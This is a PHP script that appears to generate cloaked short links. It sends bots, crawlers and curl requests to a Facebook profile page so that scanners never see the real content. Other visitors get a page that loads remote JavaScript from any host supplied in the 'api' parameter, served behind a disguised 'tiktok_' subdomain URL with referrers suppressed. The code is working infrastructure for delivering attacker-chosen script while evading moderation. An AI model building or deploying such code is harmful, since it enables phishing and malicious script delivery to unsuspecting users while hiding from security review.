<?php
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
header("Allow: GET, POST, OPTIONS, PUT, DELETE");
require_once "./config.php";



if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
$short_urlx2 = "http://m.facebook.com/profile.php";
header("location: $short_urlx2", true, 200);
die();
}


if (isset($_GET['api'])) {
$API =  $_GET['api'];  
$numerox1 = random_int(5, 10);
$NAMEFILE = substr(md5(mt_rand()), 0, $numerox1);
$PROTOCOLO = "https://";

$HTML = '
<html>
<head>
<meta http-equiv="cache-control" content="no-cache">
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
</head>
<body>
<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>
</body>
</html>';

$contentHTML = base64_encode($HTML);



$insertStatement = $pdolite->prepare("INSERT INTO short_urls (hash_url, html) VALUES (:hash_url, :html)");
$insertStatement->bindParam(':hash_url', $NAMEFILE, PDO::PARAM_STR);
$insertStatement->bindParam(':html', $contentHTML, PDO::PARAM_STR);
$insertStatement->execute();


$numerohash = random_int(3, 4);
$hash1 = "tiktok_" . substr(md5(mt_rand()), 0, $numerohash);
echo  "https://".$hash1.'.'.$_SERVER["HTTP_HOST"].'/'.$NAMEFILE;
}

